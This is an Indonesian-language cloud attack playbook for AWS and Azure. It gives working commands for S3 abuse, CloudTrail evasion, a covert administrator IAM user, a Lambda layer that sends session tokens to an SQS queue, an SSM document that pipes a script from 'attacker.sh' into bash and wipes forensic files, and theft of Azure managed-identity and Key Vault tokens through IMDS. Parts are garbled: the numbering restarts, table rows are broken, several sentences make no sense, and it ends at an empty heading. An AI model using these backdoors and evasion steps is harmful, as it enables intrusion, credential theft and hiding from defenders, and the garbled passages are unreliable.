Substitusi wildcard privilege: bucket policy `"Principal": {"AWS": "*"}` dengan `s3:GetObject` — target file `s3://config/env.sh` (terraform state / cloudformation templates).

Inventory cepat:

```bash
pacu
> run s3__enum
> run s3__download --bucket config-backups --prefix backups/
> run s3__exploit_bucket_acl
# Cek public block:
aws s3control get-public-access-block --account-id 123456789012
```

**Kenapa berhasil:** Public Access Block belum diaktifkan di account level; policy mengizinkan anonymous read/write tanpa `Condition: aws:PrincipalOrgID`.
**Kenapa gagal:** `AccessControlProperty`/`CreateBucketConfiguration` region mismatch; encrypted bucket KMS → read gagal grant KMS.

## 6. CloudTrail Evasion

| Teknik | Command | Yang di-track | Evasion |
|---|---|---|---|
| Event tidak tercatat global service | `iot secure tunneling` ld | Hidden mesh| (event log dapat di-disable |
| Event tapi diredirect | — | — | — |
| `--no-sign-request` (ann S3) | `aws s3 cp file s3://b/ --no-sign-request` | Tidak ada identity trail | anonim (IP tetap) |
| Org trail concise | `aws cloudtrail get-trail-status` | Look at multi-region trail | event `StopLogging` berbunyi alarm |
| Org trail silenced after destruction | `aws cloudtrail delete-trail --name x` | delete-trail event tetap muncul (once) di org trail |
| Log file integrity head | `aws s3api head-object s3://trailbucket/AWSLogs/...` | verificat ion SHA256 hash | — |
| Pacu | `> run sysmon__enum` not avail | e pacu `run sysmon__enum` tidak ada | **manual trail** | 

Realistic evasion via blemish target:

```bash
# Cek apa saja trail yang aktif
aws cloudtrail describe-trails --include-shadow-trails
aws cloudtrail get-event-selectors --trail-name <name>
# Exclude management events? event selectors management only read/write
aws cloudtrail get-insight-selectors --trail-name <t>
```

Celah umum:

1. **Trail single-region** → aksi dari region lain (us-east-2, ap-southeast-3) **tidak tercatat** oleh trail default region-locked.
2. **Data event exclusion** → S3 object-level (`GetObject`), Lambda `InvokeFunction` tidak tercatat kecuali excluded data events. Enum di atas exploit ini.
3. **`--dry-run` tidak pernah di track tapi tidak berpindah permission** — hanya informative recon.
4. Konsistensi log guardduty → banyak alert via GuardDuty bukan trail. Evasion untuk guardduty: kecil-kecilkan apa yang eksploiter muncul di finding (`Finding`: creds dari IMDS V2 akan muncul `UnauthorizedAccess:IAMUser/AnomalousBehavior`).
5. **Multi-account**: shadow trail di ct-akun-management — bahkan bagian management akun tidak punya read access ke bucket log → **alarm kecil**.

**Kenapa gagal:** aws:SourceIP / aws:cloudtrail: trail logic — enterprise punya detective control via CloudWatch metric `StopLogging == alarm` < 10 menit.

---

## 7. Persistence

### 7.1 IAM user (covert)

```bash
aws iam create-user --user-name svc-backup
aws iam create-access-key --user-name svc-backup
aws iam attach-user-policy --user-name svc-backup \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

**Kenapa berhasil:** admin user dengan nama `svc-*`/`backup-*`/`deploy-*` biasanya considered noise dan jarang di-audit; access key tidak expire.
**Trail signature:** 3 event: `CreateUser`, `CreateAccessKey`, `AttachUserPolicy` — cukup jelas kalau ada alerting. Kombinasi minimal: tempel policy custom kecil perm-scope yang suspicious kecil (misal `s3:Get*` + `sts:AssumeRole` service role).

Pacu: `> run iam__backdoor_users_keys --user-names svc-backup` (create backdoor policy+key).

### 7.2 Lambda layer backdoor

**Mekanisme:** layer yang loaded otomatis saat fungsi apapun di-update, handler asli tidak diubah — extension / layer. Lapisan (layer) nyambung ke semua runtime `python3.8/3.9/3.10/3.11/3.12`:

```bash
mkdir layer && cd layer
cat > secrets_cush.py <<'EOF'
import boto3, json
_s = boto3.client('sqs')
try:
    _s.send_message(
        QueueUrl='https://sqs.us-east-1.amazonaws.com/123456789012/harvest',
        MessageBody=json.dumps({
            'k': __import__('os').environ.get('AWS_SESSION_TOKEN','')[:50],
        }))
except: pass
EOF
zip -r ../layer.zip .
aws lambda publish-layer-version \
  --layer-name shared-bootstrap \
  --zip-file fileb://layer.zip \
  --compatible-runtimes python3.12 python3.11 python3.10
```

Attach via update function config (butuh `lambda:UpdateFunctionConfiguration` — prejudice dari privesc step 2):

```bash
aws lambda update-function-configuration \
  --function-name legit-proc-1 \
  --layers arn:aws:lambda:us-east-1:123456789012:layer:shared-bootstrap:1
```

Teknik `BACKDOOR_LEGIT` — handler maintain tapi overlay layer import hook `/opt/python/` (Lambda layer path) memberi prefix import precedence.

**Kenapa berhasil:** punya legitimate layer-update permission (DevOps team). Layer runtime share credential session Lambda (incl. env vars, role creds).
**Kenapa gagal:** `UpdateFunctionConfiguration` biasanya di-align; alert `lambda:UpdateFunctionConfiguration` sudah ada di baseline; checksum layer oleh framework IaC (Terraform drift check).

Pacu: `> run lambda__backdoor_new_role`, `> run lambda__backdoor_function --function-names fn1` (creates new relay).

### 7.3 SSM document backdoor

```bash
# Dokumen yang arbitrary AWS-SDK call via parameters
aws ssm create-document \
  --name "bootstrap-validation" \
  --content file://bootstrap.yaml \
  --document-type Command
# invoke any command by attach document to legit patch schedule
```

`bootstrap.yaml`:

```yaml
schemaVersion: '2.2'
mainSteps:
  - action: aws:runShellScript
    name: pingcheck
    inputs:
      runCommand:
        - curl -s https://attacker.sh/x.sh | bash -
        - rm -f /var/lib/amazon/node/instances.json  # tough forensics wipe (opsional)
```

Run on host:

```bash
aws ssm send-command \
  --document-name "bootstrap-validation" \
  --targets Key=tag:Env,Values=prod \
  --comment "routine check"
```

**Kenapa berhasil:** SSC agent command tidak perlu SSH key / IMDS enumeration — biasanya inbound-jump; `SendCommand` biasanya raffiner permission-allowed admin.
**Kenapa gagal:** `ssm:SendCommand` biasanya dibatasi document allowlist; instance SSM agent version lama (2.x) di Windows 11 24H2 jump host yang patched agent blockers; GuardDuty `ExecutionFinding` kalau ada Security Hub.

---

## 8. Jebakan Operasional (dari lapangan)

1. **Role session name polos**. `AssumeRole --role-session-name temp` sering ada alert SIEM untuk nama generic. Pakai nama sesuai pattern environment (`[a-z]+-[a-z]+`) atau default AWS (`AWS-Internal` style).
2. **Trail multi-account copy latency**. Perubahan yang dilakukan pada org trail MGMT copy adalah asinkron — **bukan** jaminan bahwa event tidak akan terkirim. Evasion single-region hanya berlaku jika CloudTrail benar-benar single-region — **buktikan via `describe-trails --include-shadow-trails`** sebelum berserah-serah.
3. **Org SCP menutup region** menghalangi region-bucket evasion — dan `AccessDenied` di SCP sering lebih mengelilingi (`Effect:Deny` bisa red herring untuk credential mati).
4. **IMDSv2 hop limit** — default 1 menghalangi SSRF melalui proxy/tambahkan hop container; kalau app dibungkus nginx 1.25 (reverse proxy) atau banyak proxy, token PUT akan gagal diam-diam (response kosong/non-200). Test secara eksplisit parameter hop dan trace.
5. **Session token expiration overlap** — kalau kamu chain `AssumeRole` (nested), total lifespan realistis 1 jam; **jangan chroot login via 2-hour assumed-role and think it persists** — re-derive credential saat clean-up (bagus untuk bersih, buruk untuk tetap).
6. **Fungsi Lambda `CreateFunction` masih perlu `iam:PassRole` no condition on `--role` parameter shema — variabel pass**. `PassRole` checks policy budget — over-privileged role letter by `lambda.amazonaws.com` trust but SimulateRole policy of role may NOT include `lambda` — permission denied from lambda services call to underlying AWS service** (policy trust is separate from permission; role trust `ec2` isn't grantable to invoke APIs you hope for).
7. **Public S3 buckets dasar sudah akses-block sejak April 2023**. Kalau bucket lama dibuat sebelum, check `get-public-access-block` dulu; banyak team enforce retroactive block via Config auto-remediation dalam < 60 detik — tulis cepat atau skip.
8. **Pacu et sera instalasi dirty**. Pacu (v1.x/2.x) banyak bergantung session SQLite — setup dengan Python v3.10/3.11 di venv terpisah; module `s3__enum` pada bucket 500K+ object akan OOM dan session crash — pakai `--regions` terbatas dan jangan `--done-all`.
9. **SSRF metadata via reap hook pada ECS variant**: kalau terlihat `AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`, jangan pakai EC2 IMDS path — beda endpoint (`169.254.170.2`).
10. **SSM `rm -rf` node instances.json** merusak inventory agent tag — GuardDuty/konfigurasi patrol bahwa agent inactive = red flag cuma **lebih besar**, jangan hapus kecuali clean exfil ke target 2-3 host saja pasti diam.
11. **`sts:GetCallerIdentity` takkued trial**: game besar — kebanyakan detection system bank-in pada `GetCallerIdentity` called from `us-east-1` hanya — kalau assuming role via `eu-west-1`, kalau kamu memanggil default region juga tampil di CallIdentity minta session-specific region — tapi IP address di VPC flow log UCUP berbeda — pastikan primitive proxy chain comprehends region.
12. **Tanpa `iam:ListRoles`**, role-target enumeration brute forced dari `sts__enum_role_result` wordlist sering **terlihat sangat lambat / rate-limited** (STS allows 100 req/sec per region tapi alert rate-limit ngeluar `RequestLimitExceeded`) — lane up internal-priority blue team alert.

## 1. Azure AD / Entra ID Enumeration (ROADtools)

### 1.1 Install & collect

```bash
roadrecon dump
roadrecon gui                        # localhost:5000, browser-based explorer
```

**Yang dikirim:** OAuth2 device-code / password grant ke `https://login.microsoftonline.com/<tenant>/oauth2/v2.0/token` dengan scope `https://graph.microsoft.com/.default` + client_id ROADtools FOCI app.
**Yang muncul:** `roadrecon.db` (SQLite) berisi seluruh objek directory: users, groups, service principals, app registrations, role assignments, OAuth2 grants.

### 1.2 Query penting

```bash
# User dengan role admin
roadrecon db --roadrecon-db roadrecon.db query \
  "SELECT p.displayName, r.roleTemplateId FROM RoleAssignments r JOIN Principals p ON p.objectId=r.objectId"
# Service principals dengan credentials (bisa impersonate)
roadrecon db query "SELECT objectId, appId, displayName FROM ServicePrincipals WHERE passwordCredentials != '[]' OR keyCredentials != '[]'"
# OAuth2 permission grants (app consent abuse)
roadrecon db query "SELECT ClientId, Scope, ConsentType FROM OAuth2PermissionGrants"
```

**Kenapa berhasil:** ROADtools pakai client FOCI (Family of Client IDs) — token yang granted ke satu app Microsoft bisa dipakai hint ke app lain. Enumerasi Graph API tidak dibatasi untuk user biasa; Azure AD by default memungkinkan user membaca hampir seluruh direktori.

## 2. Azure Managed Identity Abuse

### 2.1 Kredensial dari IMDS (Azure VM)

```bash
curl -s -H "Metadata:true" \
  "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
```

**Respon:**
```json
{"access_token":"eyJ0eXAi...","expires_on":"1735689600","resource":"https://management.azure.com/"}
```

**Kenapa berhasil:** Endpoint IMDS hanya reachable dari dalam VM, tidak butuh auth. Managed identity VM terdaftar otomatis. **Gagal bila:** Managed Identity belum di-assign ke VM (error `400`), atau IMDS v2 query parameter `Api-Version` wajib.

### 2.2 Pakai token

```bash
TOKEN=$(curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/" | jq -r .access_token)
AZ_SUB="<sub-id>"
curl -s -H "Authorization: Bearer $TOKEN" \
  "https://management.azure.com/subscriptions/$AZ_SUB/resources?api-version=2021-04-01"
```

Jika identity punya role **Contributor** → buat deployment/extension untuk RCE di VM lain, atau dump other VM.

### 2.3 SSRF ke IMDS (dari web target)

```bash
# Mode interaktif kalau IMDS key anti-SSRF
# IMDS: 169.254.169.254 selalu 040 IP → bypass via redirect di server-mu
python3 imds-ssrf-relay.py   # CreateRedirectServer → bounce → GET refresh token
# SSRF.exec akan mint with Metadata: true header
```

**Kenapa berhasil:** Azure IMDS tidak seperti GCP — tidak butuh header tambahan (no `X-Google-Metadata-Request`). Banyak server lebih memercayai 169.254.169.254 buat IMDS Azure dan terjebak pakai curl yang mengirim SSRF — metode `Metadata:true` masih wajib di bawah api-version 2018-02-01, tapi banyak verifikasi hanya memeriksa metadata:true.

### 2.4 Access token key vault / graph

```bash
# Pilih resource target: keyvault
curl -s -H "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net"
curl -s -H "Authorization: Bearer $KV_TOKEN" \
  "https://<vault>.vault.azure.net/secrets?api-version=7.4"
```

**payload.ps1:**
